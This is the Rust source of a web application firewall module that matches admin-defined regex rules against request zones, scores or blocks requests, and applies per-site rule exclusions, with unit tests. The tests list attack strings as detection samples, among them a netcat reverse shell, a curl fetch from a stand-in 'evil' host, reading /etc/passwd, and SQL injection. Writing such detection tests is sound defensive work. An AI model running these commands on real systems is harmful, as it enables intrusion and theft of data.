// =========================================================
// modules/waf.rs — EasyWAF
// WAF inspection module.
//
// For every proxied request this module:
//   1. Looks up the WAF policy assigned to the site.
//   2. Loads all enabled rules for that policy from the DB.
//   3. Matches each rule's regex against the configured zone
//      (URL, ARGS, BODY, HEADERS, or ALL of the above).
//   4. Instant-blocks on action='block' rules.
//   5. Accumulates scores; blocks when total >= score_threshold.
//
// rule_engine modes:
//   Off          — skip all checks, always Pass
//   DetectionOnly — run checks but Alert instead of Drop
//   On           — full enforcement, Drop when threshold exceeded
//
// The regex crate uses a safe automata engine — no ReDoS risk.
//
// Patterns are compiled once and cached on the module (see
// compiled_pattern), not per request: the rule set is read
// from the DB on every request, and compiling ~100 patterns
// per request dominated the cost of matching them.
// =========================================================

use crate::modules::{Detection, Findings, RuleHit, InspectionModule, ModuleDecision, RequestContext};
use async_trait::async_trait;
use axum::http::StatusCode;
use regex::Regex;
use sqlx::SqlitePool;
use std::collections::HashMap;
use std::sync::{Arc, RwLock};

// ─── WafModule ───────────────────────────────────────────

/// Pipeline module that evaluates WAF rules for every request.
pub struct WafModule {
    db: SqlitePool,
    /// Compiled patterns, keyed by the pattern source text.
    ///
    /// `None` marks a pattern that failed to compile, so a broken rule is
    /// reported once instead of on every request. Keying by the pattern rather
    /// than the rule id means an edited rule compiles its new pattern on next
    /// use with no explicit invalidation. The key space is admin-controlled
    /// (rules come from the GUI, never from request data), so it stays small.
    regex_cache: RwLock<HashMap<String, Option<Arc<Regex>>>>,
}

impl WafModule {
    /// Create a WafModule backed by the given connection pool.
    pub fn new(db: SqlitePool) -> Self {
        Self {
            db,
            regex_cache: RwLock::new(HashMap::new()),
        }
    }

    /// Return the compiled regex for a rule's pattern, compiling on first use.
    ///
    /// Returns None when the pattern is invalid; that outcome is cached too, so
    /// an unusable rule costs one failed compile and one log line for the life
    /// of the process rather than one per request.
    ///
    /// Two requests can race and compile the same pattern twice — harmless,
    /// since both produce the same value and the second insert simply wins. No
    /// lock is held across an await point.
    fn compiled_pattern(&self, rule: &RuleRow) -> Option<Arc<Regex>> {
        // Fast path — already compiled, or already known to be invalid.
        if let Ok(cache) = self.regex_cache.read() {
            if let Some(entry) = cache.get(&rule.pattern) {
                return entry.clone();
            }
        }

        // Slow path — compile once and remember the outcome either way.
        let compiled = match Regex::new(&rule.pattern) {
            Ok(re) => Some(Arc::new(re)),
            Err(e) => {
                tracing::warn!(
                    rule_id = rule.id,
                    pattern = %rule.pattern,
                    "WAF rule has invalid regex, skipping: {}",
                    e
                );
                None
            }
        };

        if let Ok(mut cache) = self.regex_cache.write() {
            cache.insert(rule.pattern.clone(), compiled.clone());
        }
        compiled
    }
}

// ─── Internal DB row types ───────────────────────────────

/// Policy configuration fetched per request.
struct PolicyInfo {
    id:                  i64,
    rule_engine:         String,
    score_threshold:     i64,
    challenge_threshold: i64,
}

/// Severity of a WAF decision before the rule_engine mode is applied.
enum Level {
    Challenge,
    Block,
}

/// A single WAF rule loaded from the DB.
struct RuleRow {
    id:      i64,
    /// The catalogue number, when the rule came from a rule set. Custom rules
    /// have none, which is why it is optional rather than defaulted to zero.
    external_id: Option<i64>,
    name:    String,
    zone:    String,
    pattern: String,
    score:   i64,
    action:  String,
}

// ─── InspectionModule impl ───────────────────────────────

#[async_trait]
impl InspectionModule for WafModule {
    fn name(&self) -> &'static str { "waf" }

    /// Evaluate all enabled rules for this request's policy.
    /// Returns Pass, Alert (DetectionOnly), or Drop (rule_engine=On).
    async fn inspect(&self, ctx: &RequestContext) -> ModuleDecision {
        // Step 1 — get the policy assigned to this site.
        let policy = match get_site_policy(&self.db, ctx.site_id).await {
            Some(p) => p,
            None    => return ModuleDecision::Pass, // no policy, skip WAF
        };

        // Step 2 — honour the rule_engine mode.
        if policy.rule_engine == "Off" {
            return ModuleDecision::Pass;
        }

        // Step 3 — load enabled rules.
        let rules = get_rules(&self.db, policy.id).await;
        if rules.is_empty() {
            return ModuleDecision::Pass;
        }

        // Step 3b — which of those this site does not apply.
        //
        // Loaded rather than filtered in SQL because the decision needs the
        // request path, and because a skipped rule is worth logging: a rule
        // that silently does not run is the kind of thing that is discovered
        // during an incident rather than before one.
        let exclusions = get_exclusions(&self.db, ctx.site_id).await;

        // Step 4 — build zone content forms from the request.
        // Each zone is a small list of candidate strings — raw, then
        // percent-decoded — matched independently rather than concatenated.
        // Concatenating would need a separator character, and a separator is
        // exactly the kind of thing a rule can accidentally match: an earlier
        // version joined forms with '\n' and a CRLF-detection rule matched
        // that '\n' on any request carrying a percent-encoded header, having
        // nothing to do with anything the client sent. See zone_text.
        // Joined with '?', as a URL is. Concatenating them directly made the
        // path run into the query — "/admin?c=1" became "/adminc=1" — so a rule
        // anchored to the end of a path never matched when a query was present,
        // and the join could manufacture a string appearing in neither half.
        let raw_url = match ctx.query.as_deref() {
            Some(q) if !q.is_empty() => format!("{}?{}", ctx.path, q),
            _                        => ctx.path.clone(),
        };
        let url     = zone_text(&raw_url, true);
        let args    = zone_text(ctx.query.as_deref().unwrap_or(""), true);
        let body    = zone_text(&String::from_utf8_lossy(&ctx.body), true);
        let headers = zone_text(
            &ctx.headers
                .values()
                .filter_map(|v| v.to_str().ok())
                .collect::<Vec<_>>()
                .join(" "),
            false,
        );
        // "ANY" is every form from every zone — still no concatenation, so a
        // zone boundary can never masquerade as content either.
        let any: Vec<&str> = url.iter().chain(&args).chain(&body).chain(&headers)
            .map(String::as_str)
            .collect();

        // Step 5 — evaluate each rule in order.
        let mut total_score: i64 = 0;
        let mut challenge_reason: Option<String> = None;
        // Every rule that matched, in the order it did, so the traffic record
        // can say what produced the score rather than only what it came to.
        let mut hits: Vec<RuleHit> = Vec::new();

        for rule in &rules {
            // A rule this site excludes never runs, and never scores. Checked
            // before matching so the cost of an exclusion is one string
            // comparison rather than a regex.
            if let Some(ex) = exclusions.iter().find(|e| e.silences(rule, &ctx.path, ctx.client_ip)) {
                tracing::debug!(
                    rule = %rule.name,
                    site = %ctx.site_name,
                    path = %ctx.path,
                    prefix = %ex.path_prefix,
                    "WAF rule skipped: excluded for this site"
                );
                continue;
            }

            // Select the candidate forms for this rule's zone. A rule matches
            // if it matches ANY one form — never a concatenation of them.
            let targets: Vec<&str> = match rule.zone.as_str() {
                "URL"     => url.iter().map(String::as_str).collect(),
                "ARGS"    => args.iter().map(String::as_str).collect(),
                "BODY"    => body.iter().map(String::as_str).collect(),
                "HEADERS" => headers.iter().map(String::as_str).collect(),
                _         => any.clone(),  // "ANY" or unrecognised
            };

            // Compiled on first use and cached; skip a rule whose pattern
            // could not be compiled.
            let re = match self.compiled_pattern(rule) {
                Some(r) => r,
                None    => continue,
            };

            if !targets.iter().any(|t| re.is_match(t)) {
                continue;
            }

            tracing::debug!(
                rule    = %rule.name,
                zone    = %rule.zone,
                score   = rule.score,
                action  = %rule.action,
                "WAF rule matched"
            );

            hits.push(RuleHit {
                id:    rule.external_id,
                name:  rule.name.clone(),
                // An instant-block rule carries its own weight rather than a
                // score, so it is reported at the threshold it forced.
                score: if rule.action == "block" { policy.score_threshold } else { rule.score },
            });

            match rule.action.as_str() {
                // Instant block regardless of score — block always wins, so
                // we can decide right here.
                "block" => {
                    let score = policy.score_threshold;
                    return decide(
                        &policy,
                        Level::Block,
                        format!("WAF block rule matched: {}", rule.name),
                        Findings { score, hits, detection: None },
                    );
                }
                // Direct challenge request — remember it but keep scanning, so
                // a later block rule can still take precedence.
                "challenge" => {
                    if challenge_reason.is_none() {
                        challenge_reason =
                            Some(format!("WAF challenge rule matched: {}", rule.name));
                    }
                }
                // Default "score" — accumulate.
                _ => { total_score += rule.score; }
            }
        }

        // Step 6 — apply thresholds. Block takes precedence over challenge.
        if total_score >= policy.score_threshold {
            return decide(
                &policy,
                Level::Block,
                format!("WAF score {} ≥ block threshold {}", total_score, policy.score_threshold),
                Findings { score: total_score, hits, detection: None },
            );
        }

        if let Some(reason) = challenge_reason {
            return decide(&policy, Level::Challenge, reason,
                          Findings { score: total_score, hits, detection: None });
        }

        if policy.challenge_threshold > 0 && total_score >= policy.challenge_threshold {
            return decide(
                &policy,
                Level::Challenge,
                format!("WAF score {} ≥ challenge threshold {}", total_score, policy.challenge_threshold),
                Findings { score: total_score, hits, detection: None },
            );
        }

        // Rules matched, and the request is allowed anyway — it stayed under
        // every threshold. That is still worth recording: reconnaissance lives
        // here, and so does the request that scores 9 against a threshold of
        // 10. Passing silently threw all of it away, in every mode, which is
        // why a policy could be quietly one point from blocking real traffic
        // with nothing to show for it.
        if !hits.is_empty() {
            return ModuleDecision::Alert {
                reason: format!(
                    "WAF score {} below block threshold {}",
                    total_score, policy.score_threshold
                ),
                findings: Findings {
                    score: total_score,
                    hits,
                    detection: Some(Detection::Observed),
                },
            };
        }

        ModuleDecision::Pass
    }
}

// ─── Zone text ───────────────────────────────────────────

/// Build the candidate forms a rule is matched against: the request text as
/// received, and its percent-decoded equivalents.
///
/// Attack payloads arrive percent-encoded far more often than not — a browser
/// encodes the spaces in `DROP TABLE users` without being asked — and matching
/// the raw text alone meant every pattern containing `\s` missed them: the same
/// payload that blocked instantly in a request body sailed through in a query
/// string.
///
/// The forms are matched independently by the caller rather than concatenated
/// into one string. Concatenation needs a separator, and a separator is
/// exactly the kind of text a rule can accidentally match — a CRLF-detection
/// rule once matched the '\n' this function used to join forms with, on any
/// request carrying a percent-encoded header, which had nothing to do with
/// what the client sent. Returning the forms separately makes that whole class
/// of bug impossible rather than relocating it to a different separator.
///
/// The raw form is kept alongside the decoded ones rather than replaced.
/// Several rules deliberately look for the encoding itself — `%252e%252e`,
/// `%00`, the double-URL-encoding protocol rule — so decoding in place would
/// trade one blind spot for another. Decoding runs twice so double-encoded
/// payloads reduce to plain text as well.
///
/// `plus_is_space` suits query strings and form bodies, where `+` encodes a
/// space. It is wrong for a path, where `+` is a literal character.
///
/// A single-element result costs only the scan for `%` — this runs per
/// request, and bodies reach 32 MB — when the text carries no encoding.
fn zone_text(raw: &str, plus_is_space: bool) -> Vec<String> {
    let has_pct  = raw.contains('%');
    let has_plus = plus_is_space && raw.contains('+');
    if !has_pct && !has_plus {
        return vec![raw.to_string()];
    }

    let mut forms = vec![raw.to_string()];

    // '+' means space in a query string, and must be substituted before
    // percent-decoding rather than after, or "%2B" would become a space too.
    let base = if has_plus { raw.replace('+', " ") } else { raw.to_string() };
    if base != raw {
        forms.push(base.clone());
    }

    let once = percent_decode(&base);
    if once != base {
        forms.push(once.clone());
    }

    let twice = percent_decode(&once);
    if twice != once {
        forms.push(twice);
    }

    forms
}

/// Percent-decode one string, returning it unchanged when it is not valid
/// encoding or does not decode to UTF-8. A malformed payload is still matched
/// in its raw form by the caller.
fn percent_decode(s: &str) -> String {
    urlencoding::decode(s)
        .map(|c| c.into_owned())
        .unwrap_or_else(|_| s.to_string())
}

// ─── decide ──────────────────────────────────────────────

/// Map a decision Level to a ModuleDecision, applying the rule_engine mode.
/// In DetectionOnly mode nothing is enforced — every decision becomes an Alert.
fn decide(
    policy: &PolicyInfo,
    level: Level,
    reason: String,
    findings: Findings,
) -> ModuleDecision {
    // DetectionOnly still reports what matched. Seeing which rules would have
    // fired is the entire point of running a policy in that mode — and until
    // 0.6.11 the Alert produced here was discarded by the proxy, so the mode
    // reported nothing at all. What would have happened is recorded on the
    // findings so the traffic record can say it.
    if policy.rule_engine == "DetectionOnly" {
        let mut findings = findings;
        findings.detection = Some(match level {
            Level::Block     => Detection::WouldBlock,
            Level::Challenge => Detection::WouldChallenge,
        });
        return ModuleDecision::Alert { reason, findings };
    }
    match level {
        Level::Challenge => ModuleDecision::Challenge { reason, findings },
        Level::Block     => {
            ModuleDecision::Drop { reason, status: StatusCode::FORBIDDEN, findings }
        }
    }
}

// ─── DB helpers ──────────────────────────────────────────

/// Fetch the WAF policy assigned to a site.
/// Returns None if the site has no policy (waf_policy_id IS NULL).
async fn get_site_policy(db: &SqlitePool, site_id: i64) -> Option<PolicyInfo> {
    sqlx::query!(
        "SELECT p.id                  as \"id!\",
                p.rule_engine,
                p.score_threshold     as \"score_threshold!\",
                p.challenge_threshold as \"challenge_threshold!\"
         FROM   policies p
         JOIN   sites    s ON s.waf_policy_id = p.id
         WHERE  s.id = ?",
        site_id
    )
    .fetch_optional(db)
    .await
    .ok()
    .flatten()
    .map(|r| PolicyInfo {
        id:                  r.id,
        rule_engine:         r.rule_engine,
        score_threshold:     r.score_threshold,
        challenge_threshold: r.challenge_threshold,
    })
}

/// Fetch all enabled rules for a policy, ordered by id.
/// One rule a site does not apply, and where and for whom it does not apply.
struct Exclusion {
    external_id: Option<i64>,
    rule_id:     Option<i64>,
    path_prefix: String,
    /// The clients this covers. `None` is every client, which is what a row
    /// written before 0.6.13 means and what the engine did before the column
    /// existed. A block that fails to parse is treated as matching nobody —
    /// see `get_exclusions`.
    client:      Option<crate::forwarded::Cidr>,
}

impl Exclusion {
    /// Does this exclusion silence `rule` on `path` for `client`?
    ///
    /// A catalogue rule is matched by its number, not by its row id, so an
    /// exclusion survives the set being removed and installed again — which
    /// rewrites every row with a new id.
    fn silences(&self, rule: &RuleRow, path: &str, client: std::net::IpAddr) -> bool {
        let same_rule = match (self.external_id, self.rule_id) {
            (Some(ext), _) => rule.external_id == Some(ext),
            (_, Some(id))  => rule.id == id,
            // The CHECK constraint makes this unreachable from the database.
            // Treated as matching nothing rather than everything: a row we
            // cannot read is not grounds for turning a rule off.
            _ => false,
        };
        if !same_rule {
            return false;
        }
        if !(self.path_prefix.is_empty() || path.starts_with(&self.path_prefix)) {
            return false;
        }
        // An exclusion with no block covers every client. One with a block
        // covers only what it names, so the rule keeps protecting the site
        // from everyone else — which is the point of narrowing by client.
        match self.client {
            Some(cidr) => cidr.contains(client),
            None       => true,
        }
    }
}

/// Exclusions recorded for this site.
///
/// Per site, not per policy: the policy is the thing being shared, so it is
/// the wrong place to record that one site disagrees with it.
async fn get_exclusions(db: &SqlitePool, site_id: i64) -> Vec<Exclusion> {
    sqlx::query!(
        "SELECT external_id, rule_id, path_prefix as \"path_prefix!\", client_cidr
         FROM   site_rule_exclusions
         WHERE  site_id = ?",
        site_id
    )
    .fetch_all(db)
    .await
    .unwrap_or_default()
    .into_iter()
    .filter_map(|r| {
        // A stored block that no longer parses would otherwise widen the
        // exclusion to every client — turning a narrow tuning into a hole
        // silently. The row is dropped and said aloud instead.
        let client = match r.client_cidr.as_deref() {
            None | Some("") => None,
            Some(raw) => match crate::forwarded::Cidr::parse(raw) {
                Some(c) => Some(c),
                None => {
                    tracing::warn!(
                        cidr = raw,
                        "Ignoring a rule exclusion whose client block cannot be parsed"
                    );
                    return None;
                }
            },
        };
        Some(Exclusion {
            external_id: r.external_id,
            rule_id:     r.rule_id,
            path_prefix: r.path_prefix,
            client,
        })
    })
    .collect()
}

async fn get_rules(db: &SqlitePool, policy_id: i64) -> Vec<RuleRow> {
    let rows = sqlx::query!(
        "SELECT id       as \"id!\",
                external_id,
                name,
                zone,
                pattern,
                score    as \"score!\",
                action
         FROM   waf_rules
         WHERE  policy_id = ? AND enabled = 1
         ORDER  BY id",
        policy_id
    )
    .fetch_all(db)
    .await
    .unwrap_or_default();

    rows.into_iter()
        .map(|r| RuleRow {
            id:          r.id,
            external_id: r.external_id,
            name:        r.name,
            zone:    r.zone,
            pattern: r.pattern,
            score:   r.score,
            action:  r.action,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::{Exclusion, RuleRow};
    use regex::Regex;

    /// Pull one rule's pattern out of the shipped catalog, so the test checks
    /// what actually loads rather than a copy that can drift from it.
    fn pattern(file: &str, id: u32) -> String {
        let text = std::fs::read_to_string(format!("rules/{file}"))
            .unwrap_or_else(|e| panic!("rules/{file}: {e}"));
        for block in text.split("[[rules]]").skip(1) {
            if !block.contains(&format!("id          = {id}")) {
                continue;
            }
            for line in block.lines() {
                if let Some(rest) = line.trim().strip_prefix("pattern     = ") {
                    return rest.trim().trim_matches('\'').to_string();
                }
            }
        }
        panic!("rule {id} not found in rules/{file}");
    }

    #[test]
    fn command_chaining_ignores_names_that_merely_start_with_a_command() {
        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();

        // A Cookie header is semicolon-separated by definition, so these are
        // ordinary traffic. "nc" matching the "nc" of "nc_token" scored 8 of a
        // threshold of 10 on every request an application like Nextcloud made.
        for benign in [
            "oc_sessionPassphrase=abc; nc_token=xyz",
            "a=1; nc_username=yariv",
            "session=1; identity=bob",
            "x=1; catalogue=shoes",
            "x=1; lsp_id=42",
            "x=1; shop_cart=3",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }
    }

    #[test]
    fn command_chaining_still_catches_the_real_thing() {
        let re = Regex::new(&pattern("932-rce.rules.toml", 932012)).unwrap();
        for attack in [
            "; nc -e /bin/sh 10.0.0.1",
            "; ls -la",
            "| cat /etc/passwd",
            "; whoami",
            "`id`",
            ";curl http://evil/x",
            "; netcat 10.0.0.1 4444",
        ] {
            assert!(re.is_match(attack), "missed {attack:?}");
        }
    }

    #[test]
    fn double_encoding_means_an_encoded_percent_not_two_escapes() {
        let re = Regex::new(&pattern("920-protocol.rules.toml", 920002)).unwrap();

        // Two escapes in a row is ordinary URL encoding, not an attack. Any
        // character outside ASCII produces several, so this used to score
        // every request carrying a non-English filename.
        for benign in [
            "requesttoken=abc%3D%3Adef%3D",
            "/files/%D7%AA%D7%9E%D7%95%D7%A0%D7%94.jpg",
            "/files/caf%C3%A9.txt",
            "/files/%F0%9F%93%81.png",
            "/x?q=hello%20%22world%22",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }

        // A percent that has itself been encoded is the real thing.
        for attack in ["%253Cscript%253E", "%252e%252e%252f", "%%3C"] {
            assert!(re.is_match(attack), "missed {attack:?}");
        }
    }

    #[test]
    fn admin_probing_is_anchored_to_the_path_root() {
        let re = Regex::new(&pattern("913-scanners.rules.toml", 913015)).unwrap();

        // An application's own settings page is not someone probing for one.
        // Unanchored, Nextcloud's /index.php/settings/admin scored 4 every time
        // an administrator opened it.
        for benign in [
            "/index.php/settings/admin",
            "/index.php/settings/admin/overview",
            "/settings/admin/serverinfo",
            "/apps/admin_audit/js/x.js",
            "/index.php/apps/theming/manager",
        ] {
            assert!(!re.is_match(benign), "false positive on {benign:?}");
        }

        for probe in [
            "/admin", "/admin/", "/admin?x=1", "/wp-admin/install.php",
            "/phpmyadmin/", "/manager/html", "/actuator/env",
            "/.env", "/phpinfo.php", "/server-status", "/web.config",
        ] {
            assert!(re.is_match(probe), "missed {probe:?}");
        }

        // .git left this rule for 913016, which blocks rather than scores. One
        // request attributed to two rules for the same reason is harder to read
        // than either alone, so it must not be matched in both places.
        assert!(!re.is_match("/.git/config"), "913015 should no longer match .git");

        let git = Regex::new(&pattern("913-scanners.rules.toml", 913016)).unwrap();
        for probe in ["/.git", "/.git/", "/.git/config", "/app/.git/HEAD"] {
            assert!(git.is_match(probe), "913016 missed {probe:?}");
        }
        // Narrower than the rule it came from, because it blocks: a repository
        // served over HTTP and a file merely named .gitignore are not the same
        // thing.
        for benign in ["/.gitignore", "/.gitattributes", "/myrepo.git/info/refs"] {
            assert!(!git.is_match(benign), "913016 false positive on {benign:?}");
        }
    }

    #[test]
    fn the_sql_comment_rule_ignores_a_mime_wildcard() {
        let re = Regex::new(&pattern("942-sqli.rules.toml", 942007)).unwrap();
        // Every HTTP client sends this by default.
        assert!(!re.is_match("*/*"));
        assert!(!re.is_match("text/html, */*;q=0.8"));
        // Still catches comments used to truncate a query.
        assert!(re.is_match("' OR 1=1 --"));
        assert!(re.is_match("UNION/**/SELECT"));
    }

    // ── Exclusions ───────────────────────────────────────

    /// A rule as the engine holds it, for the matching tests below.
    fn rule(id: i64, external_id: Option<i64>) -> RuleRow {
        RuleRow {
            id,
            external_id,
            name:    "test".into(),
            zone:    "URL".into(),
            pattern: ".".into(),
            score:   5,
            action:  "score".into(),
        }
    }

    fn by_number(external_id: i64, prefix: &str) -> Exclusion {
        Exclusion {
            external_id: Some(external_id),
            rule_id: None,
            path_prefix: prefix.into(),
            client: None,
        }
    }

    fn ip(s: &str) -> std::net::IpAddr { s.parse().expect("a literal address") }

    fn for_client(external_id: i64, cidr: &str) -> Exclusion {
        Exclusion {
            external_id: Some(external_id),
            rule_id: None,
            path_prefix: String::new(),
            client: crate::forwarded::Cidr::parse(cidr),
        }
    }

    #[test]
    fn an_exclusion_silences_only_the_rule_it_names() {
        let ex = by_number(913015, "");
        assert!( ex.silences(&rule(1, Some(913015)), "/anything", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(2, Some(913016)), "/anything", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(3, None),         "/anything", ip("203.0.113.9")));
    }

    #[test]
    fn an_empty_prefix_means_the_whole_site() {
        let ex = by_number(913015, "");
        for path in ["/", "/admin", "/deep/nested/path"] {
            assert!(ex.silences(&rule(1, Some(913015)), path, ip("203.0.113.9")), "{path} should be covered");
        }
    }

    #[test]
    fn a_prefix_confines_the_exclusion_to_that_path() {
        let ex = by_number(913015, "/remote.php/dav/");
        assert!( ex.silences(&rule(1, Some(913015)), "/remote.php/dav/files/yariv/x", ip("203.0.113.9")));
        // The rule still runs everywhere else on the site, which is the whole
        // reason for having a prefix at all.
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/remote.php/other", ip("203.0.113.9")));
    }

    #[test]
    fn a_catalogue_rule_is_matched_by_number_not_by_row_id() {
        // Removing a set and installing it again rewrites every row with a new
        // id. The exclusion has to survive that, or it stops applying at the
        // moment the rule comes back — silently, and only in production.
        let ex = by_number(913015, "");
        assert!(ex.silences(&rule(7,   Some(913015)), "/x", ip("203.0.113.9")), "before a reinstall");
        assert!(ex.silences(&rule(914, Some(913015)), "/x", ip("203.0.113.9")), "after a reinstall");
    }

    #[test]
    fn a_custom_rule_is_matched_by_row_id_because_it_has_no_number() {
        let ex = Exclusion { external_id: None, rule_id: Some(42), path_prefix: "".into(), client: None };
        assert!( ex.silences(&rule(42, None), "/x", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(43, None), "/x", ip("203.0.113.9")));
        // A row id must never reach across to a catalogue rule that happens to
        // sit at the same id.
        assert!(!ex.silences(&rule(43, Some(42)), "/x", ip("203.0.113.9")));
    }

    #[test]
    fn a_client_block_confines_the_exclusion_to_that_client() {
        // The case this exists for: a rule is right, and one client trips it.
        // Everyone else must still be protected by it.
        let ex = for_client(913015, "203.0.113.0/24");
        assert!( ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.113.9")));
        assert!( ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.113.255")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin", ip("203.0.114.1")),
                "an address outside the block must still be caught by the rule");
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin", ip("198.51.100.7")));
    }

    #[test]
    fn a_single_address_excludes_only_that_address() {
        let ex = for_client(913015, "192.168.1.50");
        assert!( ex.silences(&rule(1, Some(913015)), "/x", ip("192.168.1.50")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/x", ip("192.168.1.51")));
    }

    #[test]
    fn no_client_block_still_means_every_client() {
        // Every row written before the column existed means this, so the
        // absence of a block must not start meaning "nobody".
        let ex = by_number(913015, "");
        for addr in ["203.0.113.9", "192.168.1.50", "::1"] {
            assert!(ex.silences(&rule(1, Some(913015)), "/x", ip(addr)),
                    "{addr} should be covered by an exclusion naming no client");
        }
    }

    #[test]
    fn a_v4_client_is_not_matched_by_a_v6_block_or_the_reverse() {
        // Cidr::contains refuses to cross families; asserted here because an
        // exclusion crossing them would be a hole rather than a mismatch.
        let v6 = for_client(913015, "::/0");
        assert!(!v6.silences(&rule(1, Some(913015)), "/x", ip("203.0.113.9")));
        let v4 = for_client(913015, "0.0.0.0/0");
        assert!(!v4.silences(&rule(1, Some(913015)), "/x", ip("::1")));
    }

    #[test]
    fn the_client_block_narrows_rather_than_replaces_the_path() {
        // Both conditions must hold. An exclusion naming a path and a client
        // applies where they intersect, not where either matches.
        let ex = Exclusion {
            external_id: Some(913015),
            rule_id: None,
            path_prefix: "/admin/".into(),
            client: crate::forwarded::Cidr::parse("203.0.113.0/24"),
        };
        assert!( ex.silences(&rule(1, Some(913015)), "/admin/x", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(1, Some(913015)), "/other",   ip("203.0.113.9")),
                "right client, wrong path");
        assert!(!ex.silences(&rule(1, Some(913015)), "/admin/x", ip("198.51.100.7")),
                "right path, wrong client");
    }

    #[test]
    fn a_row_naming_neither_rule_silences_nothing() {
        // The CHECK constraint makes this unreachable through the database.
        // If it were ever reached, the safe reading of "no rule named" is no
        // rule silenced — not every rule silenced.
        let ex = Exclusion { external_id: None, rule_id: None, path_prefix: "".into(), client: None };
        assert!(!ex.silences(&rule(1, Some(913015)), "/x", ip("203.0.113.9")));
        assert!(!ex.silences(&rule(1, None),         "/x", ip("203.0.113.9")));
    }
}
